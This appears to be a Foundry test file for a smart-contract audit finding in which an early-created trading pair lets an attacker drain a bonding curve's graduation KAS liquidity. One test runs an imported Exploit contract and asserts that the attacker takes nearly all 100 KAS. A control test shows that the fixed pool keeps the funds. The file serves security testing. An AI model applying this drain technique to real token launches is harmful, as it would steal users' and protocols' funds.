// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

import "forge-std/Test.sol";
import {
    BondingCurvePoolFixed,
    Exploit,
    Kas,
    Moon,
    ZealousPair,
    ZealousRouter
} from "./62420-mnbd1-5-early-pair-creation-breaks-fair-launch-of-new-moon-t.sol";

contract Finding62420Test is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;

    function test_exploit_early_pair_drains_graduation_kas() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.curve().moonDeposited(), 100, "curve deposits 100 wei of moon");
        assertEq(e.curve().kasDeposited(), 100 ether, "curve deposits its entire 100 KAS");
        assertEq(e.kas().balanceOf(ATTACKER), 99_987_091_649_290_040_710, "attacker receives the pool KAS");
        assertEq(e.curve().kasTaken(), 99_987_091_649_290_040_710, "swap output");
    }

    function test_control_strict_mins_keep_the_kas() public {
        Kas kas = new Kas();
        Moon moon = new Moon();
        ZealousPair pair = new ZealousPair(moon, kas);
        ZealousRouter router = new ZealousRouter(pair, moon, kas);
        BondingCurvePoolFixed curve = new BondingCurvePoolFixed(router, moon, kas);

        moon.mint(address(curve), 250 ether);
        kas.mint(address(curve), 100 ether);
        curve.graduateToken();

        moon.mint(address(this), 10_000);
        moon.approve(address(router), 10_000);
        uint256 out = router.swapExactMoonForKas(10_000, address(this));

        assertEq(out, 3987, "same 10000 wei moon buys dust");
        assertEq(kas.balanceOf(address(this)), 3987, "caller is not paid the pool");
        assertEq(kas.balanceOf(address(pair)), 100 ether - 3987, "protocol KAS stays in the pair");
    }
}
